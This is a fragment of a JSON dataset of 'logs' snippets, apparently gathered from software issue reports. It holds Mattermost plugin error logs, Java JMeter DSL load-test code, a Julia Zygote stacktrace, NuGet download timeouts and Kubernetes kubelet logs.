\"}\r\n{\"level\":\"error\",\"ts\":1591898534.115114,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.6991549,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898534.862732,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=8g4dwmod77nkbyynaiyxjo1f1y Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n{\"level\":\"error\",\"ts\":1591898535.4448636,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898535.5482078,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.1768587,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898537.3703146,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.4109979,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898538.9740536,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.131942,\"caller\":\"go-plugin@v1.2.2/stream.go:15\",\"msg\":\" call to OnConfigurationChange failed, error: failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=1n46idtz47gpupjxmbrr6g8xte Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"source\":\"plugin_stderr\"}\r\n{\"level\":\"error\",\"ts\":1591898539.135249,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Server configuration is not compatible\",\"plugin_id\":\"com.mattermost.demo-plugin\"}\r\n{\"level\":\"error\",\"ts\":1591898539.702591,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"fom4du8r9pft9cycarqipexuhc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898539.8073962,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"y6bpsf5fx3f59ey6odwgbxre3c\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.547894,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"cd8wkacsgp8pjd3e5sx1ryh6fc\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898541.740053,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"4opk4n3tkpfrjbqde94cpcaq5o\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898542.7785597,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"7nqki141etnqtxgqtu4rrbhopy\",\"error\":\"SqlUserStore.Save: This team has reached the maximum number of allowed accounts. Contact your System Administrator to set a higher limit., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.3239017,\"caller\":\"mlog/sugar.go:23\",\"msg\":\"Failed add demo user to team\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"teamID\":\"qfb1qrcbejywbj7hawkzuw1btw\",\"error\":\"JoinUserToTeam: Email must be from a specific domain (e.g. @example.com). Please ask your team or system administrator for details., \"}\r\n{\"level\":\"error\",\"ts\":1591898543.475797,\"caller\":\"mlog/log.go:175\",\"msg\":\"Unable to activate plugin\",\"plugin_id\":\"com.mattermost.demo-plugin\",\"error\":\"failed to ensure demo channels: CreateChannel: A channel with that name already exists on the same team., Channelexists id=nbg69tj3gfy6icpyoswosou5pa Error 1062: Duplicate entry 'demo_plugin-z1599abuzffy8bdh4do9qzetho' for key 'Name'\"}\r\n"
    },
    {
        "logs": "`java\r\n            // workaround for\r\n            // https://github.com/victools/jsonschema-generator/issues/114\r\n            configBuilder.with(Option.NONSTATIC_NONVOID_NONGETTER_METHODS).with(jacksonModule);\r\n            configBuilder.forMethods()\r\n                    .withIgnoreCheck(method -> method.getAnnotation(JsonProperty.class) == null)\r\n                    .withPropertyNameOverrideResolver(\r\n                            method -> method.getAnnotation(JsonProperty.class).value());\r\n            configBuilder.forTypesInGeneral()\r\n                    .withTypeAttributeOverride((collectedTypeAttributes, scope, context) -> Optional\r\n                            .ofNullable(collectedTypeAttributes.get(\"properties\"))\r\n                            .map(ObjectNode.class::cast).ifPresent(properties -> {\r\n                                List<String> keysToReplace = StreamSupport\r\n                                        .stream(Spliterators.spliteratorUnknownSize(\r\n                                                properties.fieldNames(), Spliterator.ORDERED),\r\n                                                false)\r\n                                        .filter(key1 -> key1.endsWith(\"()\"))\r\n                                        .collect(Collectors.toList());\r\n                                keysToReplace.forEach(key2 -> {\r\n                                    String newKey = key2.substring(0, key2.length() - 2);\r\n                                    JsonNode value = properties.remove(key2);\r\n                                    properties.set(newKey, value);\r\n                                });\r\n                            }));\r\n            //\r\n"
    },
    {
        "logs": "`java\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.forLoopController;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.httpSampler;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.percentController;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.rpsThreadGroup;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.testPlan;\r\n\r\nimport java.io.IOException;\r\nimport java.time.Duration;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\nimport org.eclipse.jetty.http.MimeTypes.Type;\r\nimport org.junit.jupiter.api.Test;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.BaseThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\npublic class PerformanceTest {\r\n\r\n  private static class RpsFragmentProfile {\r\n\r\n    private final int rps;\r\n    private final DslSampler sampler;\r\n    private final List<RpsFragmentProfile> children;\r\n\r\n    private RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n      this.rps = rps;\r\n      this.sampler = sampler;\r\n      this.children = Arrays.asList(children);\r\n    }\r\n\r\n    private List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n      List<ThreadGroupChild> ret = new ArrayList<>();\r\n      ret.add(sampler);\r\n      ret.addAll(children.stream()\r\n          .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n          .collect(Collectors.toList()));\r\n      if (rps == parentRps) {\r\n        return ret;\r\n      }\r\n      double factor = (double) rps / parentRps;\r\n      ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n      if (factor > 1) {\r\n        double fraction = factor - Math.floor(factor);\r\n        int loops = (int) Math.ceil(factor);\r\n        return Collections.singletonList(forLoopController(loops, fraction == 0.0 ? retArr\r\n            : new ThreadGroupChild[]{percentController((float) factor / loops * 100, retArr)}));\r\n      } else {\r\n        return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n      }\r\n    }\r\n\r\n  }\r\n\r\n  private static class RpsTestPlanProfile {\r\n\r\n    private final List<RpsFragmentProfile> fragments = new ArrayList<>();\r\n\r\n    private RpsTestPlanProfile add(int rps, DslSampler sampler,\r\n        RpsFragmentProfile... children) {\r\n      fragments.add(new RpsFragmentProfile(rps, sampler, children));\r\n      return this;\r\n    }\r\n\r\n    private TestPlanStats run(Function<Integer, RpsThreadGroup> threadGroupBuilder)\r\n        throws IOException {\r\n      int maxRps = fragments.stream().mapToInt(c -> c.rps).max().orElse(0);\r\n      return testPlan(threadGroupBuilder.apply(maxRps)\r\n          .counting(RpsThreadGroup.EventType.ITERATIONS)\r\n          .children(\r\n              fragments.stream()\r\n                  .flatMap(r -> r.buildTestPlanPartWithBaseRps(maxRps).stream())\r\n                  .toArray(value -> new ThreadGroupChild[0])\r\n[Truncated]\n        .maxThreads(100)\r\n        .rampToAndHold(0.5 * baseRps, Duration.ofSeconds(10), Duration.ofMinutes(10))\r\n        .rampToAndHold(1 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10))\r\n        .rampToAndHold(1.5 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10))\r\n        .rampToAndHold(2 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10));\r\n  }\r\n\r\n  @Test\r\n  public void test() throws Exception {\r\n    new RpsTestPlanProfile()\r\n        .add(40, httpSampler(\"/api/authorization/code\").post(\"test\", Type.TEXT_PLAIN),\r\n            new RpsFragmentProfile(80, httpSampler(\"/api/profile\")),\r\n            new RpsFragmentProfile(10, httpSampler(\"/api/avatar\").post(\"test\", Type.TEXT_PLAIN)))\r\n        .add(50, httpSampler(\"/api/main_page\"))\r\n        .add(20, httpSampler(\"/redirect_link\"))\r\n        .run(PerformanceTest::buildThreadGroup);\r\n  }\r\n\r\n}\r\n"
    },
    {
        "logs": "`\r\npackage com.mechanitis.demo.junit5;\r\n\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.*;\r\n\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\n\r\n\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.configs.DslCsvDataSet;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.InfluxDbBackendListener;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.JtlWriter;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan.TestPlanChild;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\n\r\n\r\npublic class TestBuilder {\r\n    protected static class RpsFragmentProfile {\r\n\r\n        private final int rps;\r\n        private final DslSampler sampler;\r\n        private final List<RpsFragmentProfile> children;\r\n    \r\n        protected RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n            this.rps = rps;\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n    \r\n        protected List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n                .collect(Collectors.toList()));\r\n            if (rps == parentRps) {\r\n                return ret;\r\n            }\r\n            double factor = (double) rps / parentRps;\r\n            ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n            if (factor > 1) {\r\n                double fraction = factor - Math.floor(factor);\r\n                int loops = (int) Math.ceil(factor);\r\n                if (fraction == 0.0) {\r\n                    return Collections.singletonList(forLoopController(loops,retArr));\r\n                } else {\r\n                    return Collections.singletonList(forLoopController(loops,percentController((float) factor / loops * 100, retArr)));\r\n                }\r\n            } else {\r\n                return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n            }\r\n        }\r\n    }\r\n\r\n    protected static class SimpleFragmentProfile {\r\n\r\n        private final DslSampler sampler;\r\n        private final List<SimpleFragmentProfile> children;\r\n\r\n        protected SimpleFragmentProfile(DslSampler sampler, SimpleFragmentProfile... children) {\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n        protected List<ThreadGroupChild> buildTestSimplePlanPart() {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestSimplePlanPart().stream())\r\n[Truncated]\n        ));\r\n        \r\n    host = \"https:/host.io\";\r\n    TestBuilder.RpsTestPlanProfile RpsThreadGroup = new TestBuilder.RpsTestPlanProfile()\r\n        .add(30, Samplers.ProductSearch.get(host)\r\n            .children(\r\n              jsr223PostProcessor(\"vars.put('PRODUCT_PAYLOAD',props.get('PRODUCTS_PAYLOAD')); System.out.println(props.get('PRODUCTS_PAYLOAD'))\")\r\n            ))\r\n        .add(6, Samplers.ProductDictionary.get(host))\r\n        .add(4, Samplers.ProductBatch.get(host));\r\n    \r\n    \r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"showcase.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(SimpleThreadGroup.SimpleThreadGroupCreate(PerfTestNew::buildSimpleThreadGroup));\r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"products.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(RpsThreadGroup.RpsThreadGroupCreate(PerfTestNew::buildThreadGroup));\r\n    TestBuilder.TestPlanHashMap.saveAsJmx(TestBuilder.TestPlanHashMap.buildTestPlan(), \"test5.jmx\");\r\n  }\r\n}\r\n"
    },
    {
        "logs": "```java\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.forLoopController;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.httpSampler;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.percentController;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.rpsThreadGroup;\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.testPlan;\r\n\r\nimport java.io.IOException;\r\nimport java.time.Duration;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\nimport org.eclipse.jetty.http.MimeTypes.Type;\r\nimport org.junit.jupiter.api.Test;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.BaseThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\npublic class PerformanceTest {\r\n\r\n  private static class RpsFragmentProfile {\r\n\r\n    private final int rps;\r\n    private final DslSampler sampler;\r\n    private final List<RpsFragmentProfile> children;\r\n\r\n    private RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n      this.rps = rps;\r\n      this.sampler = sampler;\r\n      this.children = Arrays.asList(children);\r\n    }\r\n\r\n    private List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n      List<ThreadGroupChild> ret = new ArrayList<>();\r\n      ret.add(sampler);\r\n      ret.addAll(children.stream()\r\n          .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n          .collect(Collectors.toList()));\r\n      if (rps == parentRps) {\r\n        return ret;\r\n      }\r\n      double factor = (double) rps / parentRps;\r\n      ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n      if (factor > 1) {\r\n        double fraction = factor - Math.floor(factor);\r\n        int loops = (int) Math.ceil(factor);\r\n        return Collections.singletonList(forLoopController(loops, fraction == 0.0 ? retArr\r\n            : new ThreadGroupChild[]{percentController((float) factor / loops * 100, retArr)}));\r\n      } else {\r\n        return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n      }\r\n    }\r\n\r\n  }\r\n\r\n  private static class RpsTestPlanProfile {\r\n\r\n    private final List<RpsFragmentProfile> fragments = new ArrayList<>();\r\n\r\n    private RpsTestPlanProfile add(int rps, DslSampler sampler,\r\n        RpsFragmentProfile... children) {\r\n      fragments.add(new RpsFragmentProfile(rps, sampler, children));\r\n      return this;\r\n    }\r\n\r\n    private TestPlanStats run(Function<Integer, RpsThreadGroup> threadGroupBuilder)\r\n        throws IOException {\r\n      int maxRps = fragments.stream().mapToInt(c -> c.rps).max().orElse(0);\r\n      return testPlan(threadGroupBuilder.apply(maxRps)\r\n          .counting(RpsThreadGroup.EventType.ITERATIONS)\r\n          .children(\r\n              fragments.stream()\r\n                  .flatMap(r -> r.buildTestPlanPartWithBaseRps(maxRps).stream())\r\n                  .toArray(value -> new ThreadGroupChild[0])\r\n[Truncated]\n        .maxThreads(100)\r\n        .rampToAndHold(0.5 * baseRps, Duration.ofSeconds(10), Duration.ofMinutes(10))\r\n        .rampToAndHold(1 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10))\r\n        .rampToAndHold(1.5 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10))\r\n        .rampToAndHold(2 * baseRps, Duration.ofMinutes(1), Duration.ofMinutes(10));\r\n  }\r\n\r\n  @Test\r\n  public void test() throws Exception {\r\n    new RpsTestPlanProfile()\r\n        .add(40, httpSampler(\"/api/authorization/code\").post(\"test\", Type.TEXT_PLAIN),\r\n            new RpsFragmentProfile(80, httpSampler(\"/api/profile\")),\r\n            new RpsFragmentProfile(10, httpSampler(\"/api/avatar\").post(\"test\", Type.TEXT_PLAIN)))\r\n        .add(50, httpSampler(\"/api/main_page\"))\r\n        .add(20, httpSampler(\"/redirect_link\"))\r\n        .run(PerformanceTest::buildThreadGroup);\r\n  }\r\n\r\n}\r\n"
    },
    {
        "logs": "```\r\npackage com.mechanitis.demo.junit5;\r\n\r\nimport static us.abstracta.jmeter.javadsl.JmeterDsl.*;\r\n\r\nimport java.io.IOException;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Collections;\r\nimport java.util.List;\r\nimport java.util.function.Function;\r\nimport java.util.stream.Collectors;\r\n\r\n\r\nimport us.abstracta.jmeter.javadsl.core.testelements.DslSampler;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup.ThreadGroupChild;\r\nimport us.abstracta.jmeter.javadsl.core.configs.DslCsvDataSet;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.InfluxDbBackendListener;\r\nimport us.abstracta.jmeter.javadsl.core.listeners.JtlWriter;\r\nimport us.abstracta.jmeter.javadsl.core.DslThreadGroup;\r\nimport us.abstracta.jmeter.javadsl.core.TestPlanStats;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan.TestPlanChild;\r\nimport us.abstracta.jmeter.javadsl.core.DslTestPlan;\r\nimport us.abstracta.jmeter.javadsl.core.threadgroups.RpsThreadGroup;\r\n\r\n\r\n\r\npublic class TestBuilder {\r\n    protected static class RpsFragmentProfile {\r\n\r\n        private final int rps;\r\n        private final DslSampler sampler;\r\n        private final List<RpsFragmentProfile> children;\r\n    \r\n        protected RpsFragmentProfile(int rps, DslSampler sampler, RpsFragmentProfile... children) {\r\n            this.rps = rps;\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n    \r\n        protected List<ThreadGroupChild> buildTestPlanPartWithBaseRps(int parentRps) {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestPlanPartWithBaseRps(rps).stream())\r\n                .collect(Collectors.toList()));\r\n            if (rps == parentRps) {\r\n                return ret;\r\n            }\r\n            double factor = (double) rps / parentRps;\r\n            ThreadGroupChild[] retArr = ret.toArray(new ThreadGroupChild[0]);\r\n            if (factor > 1) {\r\n                double fraction = factor - Math.floor(factor);\r\n                int loops = (int) Math.ceil(factor);\r\n                if (fraction == 0.0) {\r\n                    return Collections.singletonList(forLoopController(loops,retArr));\r\n                } else {\r\n                    return Collections.singletonList(forLoopController(loops,percentController((float) factor / loops * 100, retArr)));\r\n                }\r\n            } else {\r\n                return Collections.singletonList(percentController((float) factor * 100, retArr));\r\n            }\r\n        }\r\n    }\r\n\r\n    protected static class SimpleFragmentProfile {\r\n\r\n        private final DslSampler sampler;\r\n        private final List<SimpleFragmentProfile> children;\r\n\r\n        protected SimpleFragmentProfile(DslSampler sampler, SimpleFragmentProfile... children) {\r\n            this.sampler = sampler;\r\n            this.children = Arrays.asList(children);\r\n        }\r\n        protected List<ThreadGroupChild> buildTestSimplePlanPart() {\r\n            List<ThreadGroupChild> ret = new ArrayList<>();\r\n            ret.add(sampler);\r\n            ret.addAll(children.stream()\r\n                .flatMap(c -> c.buildTestSimplePlanPart().stream())\r\n[Truncated]\n        ));\r\n        \r\n    host = \"https:/host.io\";\r\n    TestBuilder.RpsTestPlanProfile RpsThreadGroup = new TestBuilder.RpsTestPlanProfile()\r\n        .add(30, Samplers.ProductSearch.get(host)\r\n            .children(\r\n              jsr223PostProcessor(\"vars.put('PRODUCT_PAYLOAD',props.get('PRODUCTS_PAYLOAD')); System.out.println(props.get('PRODUCTS_PAYLOAD'))\")\r\n            ))\r\n        .add(6, Samplers.ProductDictionary.get(host))\r\n        .add(4, Samplers.ProductBatch.get(host));\r\n    \r\n    \r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"showcase.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(SimpleThreadGroup.SimpleThreadGroupCreate(PerfTestNew::buildSimpleThreadGroup));\r\n    TestBuilder.TestPlanHashMap.add(csvDataSet(\"products.csv\"));\r\n    TestBuilder.TestPlanHashMap.add(RpsThreadGroup.RpsThreadGroupCreate(PerfTestNew::buildThreadGroup));\r\n    TestBuilder.TestPlanHashMap.saveAsJmx(TestBuilder.TestPlanHashMap.buildTestPlan(), \"test5.jmx\");\r\n  }\r\n}\r\n"
    },
    {
        "logs": "`ERROR: LoadError: DimensionMismatch(\"arrays could not be broadcast to a common size; got a dimension with lengths 0 and 11\")\r\nStacktrace:\r\n  [1] _bcs1\r\n    @ .\\broadcast.jl:501 [inlined]\r\n  [2] _bcs(shape::Tuple{Base.OneTo{Int64}, Base.OneTo{Int64}}, newshape::Tuple{Base.OneTo{Int64}, Base.OneTo{Int64}}) (repeats 2 times)\r\n    @ Base.Broadcast .\\broadcast.jl:495\r\n  [3] broadcast_shape\r\n    @ .\\broadcast.jl:489 [inlined]\r\n  [4] combine_axes\r\n    @ .\\broadcast.jl:484 [inlined]\r\n  [5] instantiate\r\n    @ .\\broadcast.jl:266 [inlined]\r\n  [6] materialize\r\n    @ .\\broadcast.jl:883 [inlined]\r\n  [7] adjoint\r\n    @ C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\lib\\broadcast.jl:74 [inlined]\r\n  [8] _pullback\r\n    @ C:\\Users\\Jade\\.julia\\packages\\ZygoteRules\\AIbCs\\src\\adjoint.jl:65 [inlined]\r\n  [9] _pullback\r\n    @ C:\\Users\\Jade\\.julia\\packages\\Transformers\\V363g\\src\\basic\\loss.jl:25 [inlined]\r\n [10] _pullback(::Zygote.Context, ::typeof(logkldivergence), ::Array{Float32, 3}, ::CuArray{Float32, 3, CUDA.Mem.DeviceBuffer})\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [11] _pullback\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:82 [inlined]\r\n [12] _pullback(::Zygote.Context, ::typeof(loss), ::CuArray{Int64, 2, CUDA.Mem.DeviceBuffer}, ::CuArray{Int64, 2, CUDA.Mem.DeviceBuffer})\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [13] _pullback\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:105 [inlined]\r\n [14] _pullback(::Zygote.Context, ::var\"#4#6\")\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface2.jl:0\r\n [15] pullback(f::Function, ps::Zygote.Params)\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface.jl:338\r\n [16] gradient(f::Function, args::Zygote.Params)\r\n    @ Zygote C:\\Users\\Jade\\.julia\\packages\\Zygote\\BCfwJ\\src\\compiler\\interface.jl:75\r\n [17] train!()\r\n    @ Main C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:105\r\n [18] top-level scope\r\n    @ C:\\Users\\Jade\\OneDrive\\Documents\\juliaStuff\\test.jl:114"
    },
    {
        "logs": "`\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\nlog  : Failed to download package from 'https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg'.\r\nThe HTTP request to 'GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg' has timed out.\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\n"
    },
    {
        "logs": "```\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\nlog  : Failed to download package from 'https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg'.\r\nThe HTTP request to 'GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg' has timed out.\r\ninfo :   GET https://dotnet.myget.org/F/.../system.threading.4.0.11-rc2-23804.nupkg\r\n"
    },
    {
        "logs": "`\r\nI0207 04:04:21.578006    3515 kubelet.go:2316] SyncLoop (ADD, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\nW0207 04:04:21.578865    3515 manager.go:173] Container readiness changed for unknown container: \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" - \"://\"\r\nI0207 04:04:21.591854    3515 manager.go:1551] Need to restart pod infra container for \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\" because it is not found\r\nI0207 04:04:22.149903    3515 kubelet.go:2338] SyncLoop (PLEG): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\", event: &pleg.PodLifecycleEvent{ID:\"de019055-cd4f-11e5-98b0-42010af00007\", Type:\"ContainerStarted\", Data:\"5fca6b5e43a03a31739abd73841af77e61ba687a16368418871ff178a13d8057\"}\r\nI0207 04:06:25.161553    3515 kubelet.go:2322] SyncLoop (REMOVE, \"api\"): \"nodeport-test-wt9y2_e2e-tests-services-ga4sh(de019055-cd4f-11e5-98b0-42010af00007)\"\r\n"
    },
    {
